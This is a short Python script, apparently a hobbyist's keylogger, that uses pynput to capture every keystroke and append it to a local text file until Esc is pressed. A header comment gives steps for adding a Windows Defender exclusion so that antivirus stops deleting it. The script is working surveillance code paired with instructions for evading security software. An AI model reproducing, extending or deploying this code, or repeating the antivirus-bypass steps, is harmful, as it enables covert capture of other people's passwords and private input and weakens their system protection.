# windows kept deleting this module so i did this:
    # Virus and Threat Protection -> scroll down & click on manage settings ->
    # Scroll down to Exclusions & click on add or remove exclusions

from pynput import keyboard

def log_keys():
    f = open("key.txt", "a+")

    def on_press(key):
        if key == keyboard.Key.esc:
            return False  # stop listener
        else:
            print(str(key))
            f.write("\n" + str(key))
            
    listener = keyboard.Listener(on_press=on_press)
    listener.start()  # start to listen on a separate thread
    listener.join()